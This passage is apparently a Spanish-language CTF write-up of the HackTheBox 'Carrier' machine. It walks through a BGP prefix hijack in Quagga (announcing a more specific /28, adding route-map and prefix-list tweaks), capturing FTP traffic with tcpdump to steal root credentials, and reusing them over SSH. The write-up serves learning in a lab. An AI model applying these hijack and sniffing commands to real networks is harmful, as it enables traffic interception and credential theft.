Tiene activo `SSH`, `FTP` y `DNS`, lindo. Pues sigamos, empecemos a interactuar con la consola de `Quagga` y los "vecinos" a ver como relacionamos esta IP con los **AS**.

...

### Exploramos CLI de <u>Quagga</u> [🔗](#cli-quagga-vtysh) {#cli-quagga-vtysh}

Buscando maneras de interactuar con `Quagga` encontramos:

* [BGP routing - Peering with **Quagga**](https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#installing-quagga).
* [How to build a network of Linux routers using quagga](https://www.brianlinkletter.com/2016/06/how-to-build-a-network-of-linux-routers-using-quagga/).
* [YT : BGP Path Hijacking Attack Demo - mininet](https://youtu.be/Ovh_ceqp63M?t=149).

Para abrir la consola de comandos que se comunica con **Quagga** usamos el comando `vtysh`:

```bash
root@r1:/tmp$ vtysh 

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

r1# 
```

Perfecto, ya estamos en las puertas del router `r1` y su configuración... Del video vemos un comando interesante y que nos devuelve data mucho más interesante:

```bash
r1# show ip bgp
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgp1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Donde vemos los tres **AS**'s y subrayado tenemos las rutas que hacen, por ejemplo la primera ruta para llegar más rápido a una IP del segmento `10.100.10.0/24` seria pasar por el `AS200` directamente y la segunda mejor ruta es ir del `AS300` al `AS200`.

Encontramos [este recurso de cisco](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute_bgp/command/irg-cr-book/bgp-s1.html#wp1745539073) que nos indica dos cosas de lo que vemos:

* `*` hace referencia a una ruta válida.
* `>` hace referencia a la mejor ruta.

Bien, ya entendiendo el output, enfoquémonos en la IP relacionada con `FTP`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgp2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Las rutas para llegar más rápido a una IP del segmento `10.120.15.0/24` son: ir directamente a `AS300` o ir del `AS200` al `AS300`, acá es donde debemos nosotros como `AS100` buscar la manera de engañar al servidor y hacerle creer que pasar por nosotros es la ruta más rápida :) Así lograremos interceptar el tráfico...

Si al comando que ejecutamos antes le agregamos una IP, nos muestra las rutas para llegar a esa IP:

```bash
r1# show ip bgp 10.120.15.10
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgpIP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, mucho más entendible por si algo 🛸

...

Después de algunas pruebas nos damos cuenta de que al crear una nueva red con respecto al segmento donde esta la IP que tiene el servidor **FTP**, se modifican las rutas:

> Les paso links de los cuales recopile comandos e hice pruebas:

* [Configuring BGP (IPv4)](https://www.jamieweb.net/blog/bgp-routing-security-part-1-bgp-peering-with-quagga/#configuring-bgp-ipv4).
* [BGP Prefix Hijack Attacks - ColoState](https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking).
* [Solución de problemas cuando las rutas del BGP no están anunciadas](https://www.cisco.com/c/es_mx/support/docs/ip/border-gateway-protocol-bgp/19345-bgp-noad.html).

Así que lo dicho, vamos a crear una red en el `AS100` (nosotros) que en su segmento de IPs contenga la que tiene el servidor FTP, validaremos las rutas de la nueva red eeee interceptaremos el tráfico que pase ahora por nuestro `AS100`:

<span style="color: yellow;">1. </span>Creamos red:

```bash
r1# conf t
r1(config)# router bgp 100
r1(config-router)# network 10.120.15.0/24
```

No voy a profundizar mucho en esto, pero me guiaré del comentario de [Franco Ramírez en Quora](https://es.quora.com/Qu%C3%A9-significan-los-dos-%C3%BAltimos-n%C3%BAmeros-de-una-direcci%C3%B3n-IP) para que se entienda un poco la red `10.120.15.0/24`:

Cada IP tiene 4 octetos, o sea, 4 "cajoncitos" (para ser gráficos) de 8 bits cada uno, por lo cual una IP tendría en total `32` bits (el cálculo de `8*4`). Perfecto, toma sentido esto:

> "El número 24 nos dice que, de los 32 bits que constituyen la dirección, 24 le pertenecen a la red", nos dice [Franco](https://es.quora.com/Qu%C3%A9-significan-los-dos-%C3%BAltimos-n%C3%BAmeros-de-una-direcci%C3%B3n-IP).

Si usamos una [calculadora de IPs](https://www.iptp.net/es_ES/iptp-tools/ip-calculator/), vemos el rango de direcciones que podemos ahondar con esa red:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_ipcalculator_24ranges.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Crearemos una red que puede tomar IPs desde la `10.120.15.1` hasta la `10.120.15.254`, entre ellas esta la que nos interesa, `10.120.15.10`, perfecto.

<span style="color: yellow;">2. </span>Validamos la creación de la red y las rutas:

```bash
r1(config-router)# exit
r1(config)# exit
r1# show running-config
...
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 network 10.120.15.0/24
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
...
```

Perfesto, vemos que la red ya esta en la configuración, validamos las rutas:

```bash
r1# show ip bgp
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_r1SH_vtysh_shIPbgpNewETWORK.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora vemos que como ruta deseada por las IPs del segmento `10.120.15.0/24` estamos nosotros, `0.0.0.0` (: validemos si esto es cierto, usemos `tcpdump` para escuchar el tráfico que pase por cualquier interfaz y sobre el puerto `21` (FTP), guardamos todo en un archivo llamado `hola.pcap`:

```bash
r1# write
```

* [How to capture and analyze packets with tcpdump command on Linux](https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/).

---

```bash
root@~:r1$ tcpdump -i any port 21 -w hola.pcap
```

Pero después de un rato, no se nos guarda nada en el archivo, por lo que sabemos que hay algo extraño que no permite aún interceptar el tráfico :(

---

### Logramos <u>BGP Hijacking</u> pero con un fallito (tamos cerca) [🔗](#fail-bgp-hijacking-ftp) {#fail-bgp-hijacking-ftp}

Jugando y jugando, hay algo llamativo:

Como ya vimos la red `10.120.15.0/24` nos pondrá a disposición `254` hosts, entre ellos el terminado en `10` que es el que necesitamos. Si aumentamos la máscara nos restara hosts, por ejemplo con la red `10.120.15.0/25` tendremos `126` hosts y también esta la `10`.

Pero ¿y si debemos hacer que nuestra red sea lo más especifica posible y que apenas llegue la conexión se dirija si o si a nosotros?

Pues si seguimos los ejemplos de arriba, podemos usar la red `10.120.15.0/28`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_ipcalculator_28ranges.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ella generará simplemente `14` hosts para repartir y si, entre ellos esta la que necesitamos, la `10`.

Intentémoslo:

```bash
r1# conf t
r1(config)# router bgp 100
r1(config-router)# network 10.120.15.0/28
r1(config-router)# exit
r1(config)# exit
r1# write
Building Configuration...
Configuration saved to /etc/quagga/zebra.conf
Configuration saved to /etc/quagga/bgpd.conf
[OK]
r1#
```

Jugamos ahora con `tcpdump`:

```bash
root@~:r1$ tcpdump -i any port 21 -w hola.pcap
```

Yyyyyyyy después de un rato, si vemos el tamaño del archivoooooooooooooo:

```bash
root@~:r1$ ls -la 
...
-rw-r--r-- 1 root root 9592 Jul 29 25:25 hola.pcap
...
```

OPAAAA, hay contenido, 9K, si le hacemos un `cat` no se entiende nada, así que movamos el archivo a nuestra máquina y lo abrimos con `wireshark`:

```bash
root@~:r1$ cat hola.pcap | base64 | tr -d '\n'
```

Lo tenemos en **base64**, copiamos tooodo y ahora:

```bash
❱ echo "todo_el_base64" | base64 -d > hola.pcap
❱ file hola.pcap 
hola.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
```

Listones:

```bash
# Abrimos Wireshark en segundo plano y que no nos ocupe la terminal
❱ (wireshark hola.pcap >& /dev/null &)
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_fail_RETRANSMISSION.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmm, montón de errores en la transmisión, pero bueno, tenemos respuesta, vemos la comunicación entre `10.78.10.2` y `10.78.11.2` contra la IP `10.120.15.10`, por lo que vamos suuuuuuuper, ahora solo nos queda ver porque pasa esto...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_gif_minionsexcited.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

En internet encontramos esta definición del error:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_packetRetransmissionERROR.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomada de [dynatrace, "Detecting network errors and their impact on services"](https://www.dynatrace.com/news/blog/detecting-network-errors-impact-on-services/).

Varias cositas, quizás el paquete se pierda y no llega al destino (nosotros), hay algún bloqueo o como dice ahí, alguna congestión que evita que los paquetes viajen correctamente...

...

### <u>BGP Hijacking</u> hecho y vemos credenciales en tráfico FTP [🔗](#done-bgp-hijacking-ftp) {#done-bgp-hijacking-ftp}

🚢 Nutriéndonos de info sobre `BGP Hijacking` encontramos un **POC** con una estructura prácticamente igual a la que tenemos, solo que son diferentes IPs, pero, es igual, 3 routers y 2 de ellos comunicados mediante **FTP**:

* [BGP Hijacking: Demo](https://neff.blog/2019/06/05/bgphijacking-part2/).

Hay una parte en la que agrega unas líneas distintas a las que hemos usado y al final nos muestra que su explotación fue hecha con éxito, así que podemos probar lo que tiene él:

Nos explica que usa esas líneas (ya las veremos) porque el tráfico no alcanza a llegar al servidor `FTP`, ya que (en su ejemplo) el *router 3* reenvía el tráfico al *router 1* por un tema de "prefijos" (que serian como indicadores de un conjunto de direcciones). Entonces el tráfico queda como en bucle y cada *router* reenvía la data al otro.

Por lo tanto él actualiza las políticas de enrutamiento en el *router 1* indicando que el tráfico sea reenviado totalmente hacia el *router 3*, lo que permite que el servidor **FTP** reciba las peticiones.

> Pueees, suena como algo que nos pueda estar pasando, sigamoslo.

Definimos un prefijo que contenga todos los hosts de nuestra red, se llamara `holacomoes`:

```bash
r1# conf t
r1(config)# ip prefix-list holacomoes seq 5 permit 10.120.15.0/28
```

Evitamos que `AS100` comparta las direcciones de nuestro prefijo con `AS300`:

```bash
r1(config)# route-map to-as300 deny 5
r1(config-route-map)# match ip address prefix-list holacomoes
r1(config-route-map)# exit
```

Ahora permitimos que `AS100` comparta la lista de direcciones con `AS200`, peeero también le decimos (con `set ...`) que `AS200` no comparta sus prefijos (listas de direcciones) con otros routers:

```bash
r1(config)# route-map to-as200 permit 5
r1(config-route-map)# match ip address prefix-list holacomoes
r1(config-route-map)# set community no-export
r1(config-route-map)# exit
r1(config)# exit
```

Y ahora simplemente guardamos para que los cambios hagan efecto:

```bash
r1# clear ip bgp * out
r1# write
```

Para ver como nos quedó la conf podemos ya sea ver el archivo `/etc/quagga/bgpd.conf` o usar:

````bash
r1# show running-config
```

```bash
...
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 network 10.120.15.0/28
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.11.2 route-map to-as300 out
!
ip prefix-list holacomoes seq 5 permit 10.120.15.0/28
!
route-map to-as300 deny 5
 match ip address prefix-list holacomoes
!
route-map to-as200 permit 5
 match ip address prefix-list holacomoes
 set community no-export
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10
!
...
```

Listo, pues pongámonos de nuevo en escucha con `tcpdump` y descubramos si hay algo nuevo en el tráfico:

1. `tcpdump -i any port 21 -w hola.pcap`
2. Esperamos un rato.
  * (Vemos que el tamaño del archivo es más grande, ¿nos emocionamos desde ya?) 
3. Copiamos el contenido del archivo, lo pasamos a **base64**.
4. Pegamos la cadena en nuestra máquina, generamos un archivo con ella.
5. Abrimos el paquete ya sea con `tshark` o `wireshark`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_DONE_credentialsFTP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAAAAAAAAAAAa que se ve por ahííííííííí?????????? DIOSSSSSSSSSSSSSS

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_wireshark_packetFTPwithCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiiiiiiiiiiiialksdfjlkañjsdlfkñjklasjdglkk

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_gif_muppetexcited.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

¡Que belleza esto POR FA VOOOOOOOOOOOOOOOOOOOR! Brutal...

Bueno, tenemos unas credenciales de un usuario llamado `root` en su conexión contra el servidor **FTP**, pueeeeeeeeeeeeeeees, hagamos reutilización de contraseñas y probémoslas contra el servicio `SSH` y el usuario **root**:

```bash
❱ ssh root@10.10.10.105
root@10.10.10.105's password:
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_ssh_rootSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

TAMOO compai', estamos en el sistema como el usuario **root**, en el trafico `FTP` vimos algo sobre un archivo llamado `secretdata.txt`, pero el contenido es el hash de la flag `user.txt`, así que no nos preocupamos por el.

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Po hemo teminao'

...

Muy divertida esta máquina, locura brutal el tema del `BGP Hijacking`, debo decir que las redes no son ni mi fuerte ni mi gusto, pero uff esta máquina me hizo como olvidarme de esto y disfrutar un mónton el proceso. 

Increible esto ⛲

Y bueno, nos leeremos despues, muchas gracias por todo <3 YYYYYYY a seguir rompiendo todo!!